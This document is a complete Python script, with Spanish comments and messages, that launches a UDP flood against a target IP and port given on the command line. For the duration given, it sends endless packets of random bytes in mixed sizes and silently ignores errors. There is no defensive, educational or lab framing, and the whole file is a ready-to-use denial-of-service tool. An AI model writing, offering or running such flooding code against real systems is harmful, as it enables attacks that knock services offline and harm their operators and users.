#!/usr/bin/env python3
import socket
import random
import time
import sys

def mix_attack(target_ip, target_port, duration):
    print(f"[MIX] Atacando {target_ip}:{target_port} por {duration}s")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    
    # Diferentes tamaños de paquetes random
    packet_sizes = [64, 128, 256, 512, 1024, 1400]
    
    while time.time() < end_time:
        try:
            for size in packet_sizes:
                data = random._urandom(size)
                sock.sendto(data, (target_ip, target_port))
        except:
            pass
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) == 4:
        mix_attack(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
